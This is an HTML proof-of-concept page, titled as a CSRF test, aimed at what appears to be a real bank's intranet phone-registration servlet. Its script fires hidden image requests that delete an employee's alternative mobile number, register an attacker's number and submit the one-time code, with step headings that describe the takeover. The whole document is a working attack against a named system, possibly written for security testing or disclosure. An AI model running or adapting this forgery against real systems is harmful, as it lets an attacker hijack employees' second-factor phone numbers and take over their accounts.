<html>
    <head>
        <h1>My Security CSRF Test</h1>
    </head>
    <script>

        function deleteNumber() {
            var param = 'phone=&action=KSNS_ALTMOV_ACTION_BORRADO';
            get('delete number', param);
        }

        function addNumber() {
            var num = document.getElementById('number').value;
            var param = 'phone='+num+'&checkbox-btns-sprite=on&altmovnew=0034'+num+'&action=KSNS_ALTMOV_ACTION_ALTA';
            get('add number', param);
        }

        function sendOTP() {
            var otp = document.getElementById('otp').value;
            var param = 'idClave='+otp+'&otp='+otp+'&action=KSNS_ALTMOV_ACTION_OTP';
            get('send otp', param);
        }

        function get(msg, param) {
            var url = 'https://portalintranet.es.igrupobbva/KSNSH/ksns_mult_web/RegistroAlterMovilServlet?' + param;
            var dom_img = document.createElement('img');
            dom_img.src = url;
            dom_img.style.display = "none";
            document.body.appendChild(dom_img);
        }

        // First, ensure a Cookies are set by doing a dummy request
        get('dummy request', '');


    </script>
    <body>

	    <h3>First we remove current alternative number (OPTIONAL STEP)</h3>
	    <button  type="button" onclick="deleteNumber()">Delete phone number</button>

	    <h3>Now we add attacker's phone number (cannot be currently registered for other employee)</h3>
        <input type=text id="number">
	    <button  type="button" onclick="addNumber()">Add phone number</button>
        
	    <h3>Now we send the OTP (we could get this automatically via polling from attacker's side)</h3>
        <input type=text id="otp">
	    <button  type="button" onclick="sendOTP()">Send OTP</button>
    </body>
</html>
